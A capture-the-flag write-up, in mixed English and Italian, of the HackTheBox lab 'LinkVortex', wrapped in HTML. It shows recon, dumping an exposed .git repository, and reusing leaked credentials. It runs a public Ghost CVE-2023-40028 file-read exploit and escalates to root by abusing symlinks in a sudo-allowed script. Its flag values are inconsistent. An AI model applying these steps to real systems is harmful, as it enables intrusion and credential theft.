@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>REPORT.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="linkvortex">LinkVortex</h1>
+<p><img src="./images/LinkVortex.png" alt="linkvortex"></p>
+<p>Target: 10.10.11.47</p>
+<p>Port scanning:</p>
+<pre class="hljs"><code><div>$ nmap -sC -sV -oA nmap/top1000 10.10.11.47
+</div></code></pre>
+<p>Results:</p>
+<ul>
+<li>22/tcp ,OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0).</li>
+<li>80/tcp, Apache httpd, redirect to <code>http://linkvortex.htb/</code>.</li>
+</ul>
+<p>[+] Ubuntu Jammy (22.04)</p>
+<p>Update local dns:</p>
+<pre class="hljs"><code><div>kali $ vim /etc/hosts
+</div></code></pre>
+<p>Append to <code>/etc/hosts</code>:</p>
+<pre class="hljs"><code><div>10.10.11.47     linkvortex.htb
+</div></code></pre>
+<p>The web app uses the <code>ghost</code> CMS version <code>5.58</code>.</p>
+<p><img src="./images/01.png" alt="01"></p>
+<blockquote>
+<p><a href="https://ghost.org/">Ghost</a> is a powerful app for new-media creators to publish, share, and grow a business around their content.</p>
+</blockquote>
+<p>There is an author: <code>admin</code>.</p>
+<p><img src="./images/02.png" alt="02"></p>
+<p>From the <a href="https://ghost.org/docs/">ghost documentation</a> discover the <code>Admin API</code> uses to which has both read and write access used to create and update content.</p>
+<p>Security results are commit in <a href="https://github.com/TryGhost/Ghost">github</a>.</p>
+<p>The <code>robots.txt</code> reveals some path.</p>
+<p><img src="./images/03.png" alt="03"></p>
+<p>The <code>/ghost/</code> path redirect to a <code>Sign in</code> page.</p>
+<p><img src="./images/04.png" alt="04"></p>
+<p>Virtual hosting routing scanning with <code>ffuf</code>:</p>
+<pre class="hljs"><code><div>$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://linkvortex.htb -H &quot;Host: FUZZ.linkvortex.htb&quot; -o ffuf/vhost -of csv -v
+
+$ cat ffuf/vhost | cut -d&quot;,&quot; -f1,5 | grep -nv &quot;.*,301&quot;
+1:FUZZ,status_code
+32:dev,200
+</div></code></pre>
+<p>Result:</p>
+<ul>
+<li><code>dev.linkvortex.htb</code></li>
+</ul>
+<p>Updates the local dns.</p>
+<pre class="hljs"><code><div>10.10.11.47     linkvortex.htb dev.linkvortex.htb
+</div></code></pre>
+<p>Visit <code>http://dev.linkvortex.htb</code>.</p>
+<p><img src="./images/05.png" alt="05"></p>
+<p>This suggest that the web page is in development mode, potrebbe esserci un controllo di versione quale <code>.git</code>.</p>
+<p>Visit <code>http://dev.linkvortex.htb/.git</code>.</p>
+<p><img src="./images/06.png" alt="06"></p>
+<p>Si utilizza <code>git-dumper</code> per recuperare il <code>codebase</code>.</p>
+<pre class="hljs"><code><div>$ python3 -m venv venv &amp;&amp; source venv/bin/activate &amp;&amp; pip install git-dumper
+
+$ git-dumper http://dev.linkvortex.htb/.git ./codebase/
+</div></code></pre>
+<p>Con una ricerca sul web, si è appreso della esistenza di una vulnerabilità per <code>Ghost 5.58</code>.</p>
+<p>[+] <a href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028">CVE 2023-40028</a></p>
+<p>This script exploits a vulnerability in Ghost CMS (CVE-2023-40028) to read arbitrary files from the server. By leveraging a symlink in an uploaded ZIP file, an attacker can gain unauthorized access to sensitive files on the system.</p>
+<p>Try to gain access as user.</p>
+<pre class="hljs"><code><div>$ ls -lah codebase/
+total 1.4M
+drwxrwxr-x  7 kali kali 4.0K Mar 18 11:17 .
+drwxrwxr-x  8 kali kali 4.0K Mar 18 11:16 ..
+drwxrwxr-x  8 kali kali 4.0K Mar 18 11:17 apps
+-rw-rw-r--  1 kali kali  521 Mar 18 11:17 Dockerfile.ghost
+-rw-rw-r--  1 kali kali  312 Mar 18 11:17 .editorconfig
+drwxrwxr-x 80 kali kali 4.0K Mar 18 11:17 ghost
+drwxrwxr-x  7 kali kali 4.0K Mar 18 11:17 .git
+-rw-rw-r--  1 kali kali  122 Mar 18 11:17 .gitattributes
+drwxrwxr-x  7 kali kali 4.0K Mar 18 11:17 .github
+-rw-rw-r--  1 kali kali 3.1K Mar 18 11:17 .gitignore
+-rw-rw-r--  1 kali kali  135 Mar 18 11:17 .gitmodules
+-rw-rw-r--  1 kali kali 1.1K Mar 18 11:17 LICENSE
+-rw-rw-r--  1 kali kali  888 Mar 18 11:17 nx.json
+-rw-rw-r--  1 kali kali 3.5K Mar 18 11:17 package.json
+-rw-rw-r--  1 kali kali 2.8K Mar 18 11:17 PRIVACY.md
+-rw-rw-r--  1 kali kali 5.3K Mar 18 11:17 README.md
+-rw-rw-r--  1 kali kali  518 Mar 18 11:17 SECURITY.md
+drwxrwxr-x  2 kali kali 4.0K Mar 18 11:17 .vscode
+-rw-rw-r--  1 kali kali 1.4M Mar 18 11:17 yarn.lock
+</div></code></pre>
+<p>Per sfruttare la <code>Local File Inclusion</code> bisogna avere un account per accedere alle funzionalità che Ghost mette a disposizione.</p>
+<p>Discovery di informazioni per il login.</p>
+<p>Used <a href="">detection_email.sh</a> script to collect some emails in <code>codebase/</code>.</p>
+<pre class="hljs"><code><div>$ ../detect_email.sh . ../email.txt
+</div></code></pre>
+<p>There are <code>837</code> emails detected.</p>
+<p>E' lecito pensare che, vista la presenza di un autore <code>admin</code> che ha pubblicato del contenuto nel blog, allora la sua email potrebbe essere del tipo <code>admin@*.*</code>.</p>
+<pre class="hljs"><code><div>$ grep &quot;admin&quot; email.txt 
+admin+1@ghost.org
+admin-api-key-test@example.com
+admin@example.com
+administrator@test.com
+newadmin@test.com
+test+admin@ghost.org
+</div></code></pre>
+<p>Per tutti questi risultati, la pagina restituisce una non corrispondenza.</p>
+<pre class="hljs"><code><div>$ grep &quot;linkvortex&quot; email.txt 
+dev@linkvortex.htb
+</div></code></pre>
+<p>Non funziona, ma questo puo far pensare alla esistenza di una email del tipo <code>admin@linkvortex.htb</code>.</p>
+<p><img src="./images/07.png" alt="07"></p>
+<p>Si cerca una possibile password in <code>codebase/</code>.</p>
+<p>Con il comando</p>
+<pre class="hljs"><code><div>$ grep -rinh &quot;password =&quot; .
+</div></code></pre>
+<p>si sono trovati due corrispondenze interessanti:</p>
+<ul>
+<li>OctopiFociPilfer45</li>
+<li>thisissupersafe</li>
+</ul>
+<p>Si ha accesso alla pagina <code>http://linkvortex.htb/ghost/#/dashboard</code> con le credenziali:</p>
+<ul>
+<li>admin@linkvortex.htb:OctopiFociPilfer45</li>
+</ul>
+<p><img src="./images/08.png" alt="08"></p>
+<pre class="hljs"><code><div>$ git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git
+</div></code></pre>
+<p>Si lancia l'exploit:</p>
+<pre class="hljs"><code><div>$ ./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45' -h http://linkvortex.com                                                                                                        
+WELCOME TO THE CVE-2023-40028 SHELL                                                                                                                                                                       
+Enter the file path to read (or type 'exit' to quit): /etc/passwd
+File content:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+</div></code></pre>
+<p>Users muniti di <code>/bin/bash</code>:</p>
+<ul>
+<li>root:0:0</li>
+<li>node:1000:1000</li>
+</ul>
+<p>Tentativo di accesso con ssh per <code>node</code>.</p>
+<p>Le password collezionate e presenti in <code>codebase/</code> non permettono l'accesso con ssh.</p>
+<p>Si analizza il file <code>Dockefile.ghost</code>:</p>
+<pre class="hljs"><code><div>$ cat Dockerfile.ghost 
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT [&quot;/entry.sh&quot;]
+CMD [&quot;node&quot;, &quot;current/index.js&quot;]
+</div></code></pre>
+<p>Si utilizza l'exploit per ottenere il file <code>/var/lib/ghost/config.production.json</code>.</p>
+<pre class="hljs"><code><div>File content:
+{
+  &quot;url&quot;: &quot;http://localhost:2368&quot;,
+  &quot;server&quot;: {
+    &quot;port&quot;: 2368,
+    &quot;host&quot;: &quot;::&quot;
+  },
+  &quot;mail&quot;: {
+    &quot;transport&quot;: &quot;Direct&quot;
+  },
+  &quot;logging&quot;: {
+    &quot;transports&quot;: [&quot;stdout&quot;]
+  },
+  &quot;process&quot;: &quot;systemd&quot;,
+  &quot;paths&quot;: {
+    &quot;contentPath&quot;: &quot;/var/lib/ghost/content&quot;
+  },
+  &quot;spam&quot;: {
+    &quot;user_login&quot;: {
+        &quot;minWait&quot;: 1,
+        &quot;maxWait&quot;: 604800000,
+        &quot;freeRetries&quot;: 5000
+    }
+  },
+  &quot;mail&quot;: {
+     &quot;transport&quot;: &quot;SMTP&quot;,
+     &quot;options&quot;: {
+      &quot;service&quot;: &quot;Google&quot;,
+      &quot;host&quot;: &quot;linkvortex.htb&quot;,
+      &quot;port&quot;: 587,
+      &quot;auth&quot;: {
+        &quot;user&quot;: &quot;bob@linkvortex.htb&quot;,
+        &quot;pass&quot;: &quot;fibber-talented-worth&quot;
+        }
+      }
+    }
+}
+</div></code></pre>
+<p>Si sono effettuati altri tentativi per accedere ad una shell remota.</p>
+<ul>
+<li>bob@10.10.11.47:fibber-talented-worth</li>
+</ul>
+<p>Accesso ottenuto.</p>
+<pre class="hljs"><code><div>bob@linkvortex:~$ ls -lah
+total 28K
+drwxr-x--- 3 bob  bob  4.0K Nov 30 10:07 .
+drwxr-xr-x 3 root root 4.0K Nov 30 10:07 ..
+lrwxrwxrwx 1 root root    9 Apr  1  2024 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 bob  bob   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 bob  bob  3.7K Jan  6  2022 .bashrc
+drwx------ 2 bob  bob  4.0K Nov  1 08:40 .cache
+-rw-r--r-- 1 bob  bob   807 Jan  6  2022 .profile
+-rw-r----- 1 root bob    33 Mar 19 21:48 user.txt
+
+bob@linkvortex:~$ cat user.txt
+e67ed2c07cbdc3c***************f0
+
+bob@linkvortex:~$ sudo -l
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+</div></code></pre>
+<blockquote>
+<p>user.txt:69ee55437ca082***************f3</p>
+</blockquote>
+<pre class="hljs"><code><div>bob@linkvortex:/opt/ghost$ ls -lah
+total 48K
+drwxr-xr-x  4 root    root 4.0K Nov 30 10:07 .
+drwxr-xr-x  5 root    root 4.0K Nov 30 10:07 ..
+-rw-------  1 root    root  521 Apr  1  2024 Dockerfile.ghost
+-rw-------  1 root    root  185 Apr  1  2024 Dockerfile.ghost-db
+-rwxr--r--  1 root    root  745 Nov  1 08:46 clean_symlink.sh
+-rw-r--r--  1 root    root  645 Apr  1  2024 config.production.json
+drwxr-xr-x 11    1000 root 4.0K Apr  1  2024 content
+-rw-------  1 root    root 1.4K Apr  1  2024 docker-compose.yml
+-rw-------  1 root    root  238 Apr  1  2024 entry.sh
+drwxr-xr-x  8 _laurel root 4.0K Mar 19 21:45 mysql
+-rw-------  1 root    root 5.2K Apr  1  2024 wait-for-it.sh
+</div></code></pre>
+<p>Analisi dello script <code>clean_symlink.sh</code>:</p>
+<pre class="hljs"><code><div>bob@linkvortex:/opt/ghost$ cat -n clean_symlink.sh 
+     1  #!/bin/bash
+     2
+     3  QUAR_DIR=&quot;/var/quarantined&quot;
+     4
+     5  if [ -z $CHECK_CONTENT ];then
+     6    CHECK_CONTENT=false
+     7  fi
+     8
+     9  LINK=$1
+    10
+    11  if ! [[ &quot;$LINK&quot; =~ \.png$ ]]; then
+    12    /usr/bin/echo &quot;! First argument must be a png file !&quot;
+    13    exit 2
+    14  fi
+    15
+    16  if /usr/bin/sudo /usr/bin/test -L $LINK;then
+    17    LINK_NAME=$(/usr/bin/basename $LINK)
+    18    LINK_TARGET=$(/usr/bin/readlink $LINK)
+    19    if /usr/bin/echo &quot;$LINK_TARGET&quot; | /usr/bin/grep -Eq '(etc|root)';then
+    20      /usr/bin/echo &quot;! Trying to read critical files, removing link [ $LINK ] !&quot;
+    21      /usr/bin/unlink $LINK
+    22    else
+    23      /usr/bin/echo &quot;Link found [ $LINK ] , moving it to quarantine&quot;
+    24      /usr/bin/mv $LINK $QUAR_DIR/
+    25      if $CHECK_CONTENT;then
+    26        /usr/bin/echo &quot;Content:&quot;
+    27        /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null
+    28      fi
+    29    fi
+    30  fi
+</div></code></pre>
+<p>Lo script <code>clean_symlink.sh</code> viene eseguito con i permessi di <code>root</code> ed in sostanza, permette di leggere il contenuto di un file soddisfacendo i seguenti requisiti:</p>
+<ol>
+<li>il <code>payload</code> deve essere un file con estenzione .png;</li>
+<li>deve essere un file di tipo <code>symlink</code>;</li>
+<li>il <code>symlink</code> non deve essere comprendere file di <code>/etc</code> e <code>/root</code>;</li>
+<li>la variabile di ambiente <code>CHECK_CONTENT</code> deve essere settata a un valore diverso dalla stringa vuota per poter ottenere in output il contenuto del file passato in input allo script.</li>
+</ol>
+<p>Si puo utilizzare questo script per accedere a risorse sensibili.</p>
+<p>Struttura dei <code>symbolic link</code> da definire:</p>
+<p>payload.png -&gt; normal file -&gt; file with no read permission for bob</p>
+<pre class="hljs"><code><div>bob@linkvortex:/opt/ghost$ find / -name root 
+find: ‘/root’: Permission denied
+</div></code></pre>
+<pre class="hljs"><code><div>bob@linkvortex:/opt/ghost$ mkdir ~/payload/
+bob@linkvortex:/opt/ghost$ ln -s -T /root/root.txt ~/payload/file
+bob@linkvortex:/opt/ghost$ ln -s -T ~/payload/file ~/payload/file.png
+bob@linkvortex:/opt/ghost$ cat ~/payload/file.png 
+cat: /home/bob/payload/file.png: Permission denied
+</div></code></pre>
+<pre class="hljs"><code><div>bob@linkvortex:/opt/ghost$ sudo CHECK_CONTENT=&quot;true&quot; /usr/bin/bash /opt/ghost/clean_symlink.sh ~/payload/file.png 
+Link found [ /home/bob/payload/file.png ] , moving it to quarantine
+Content:
+69ee55437ca082***************f3
+</div></code></pre>
+<blockquote>
+<p>root.txt:69ee55437ca082***************f3</p>
+</blockquote>
+
+</body>
+</html>
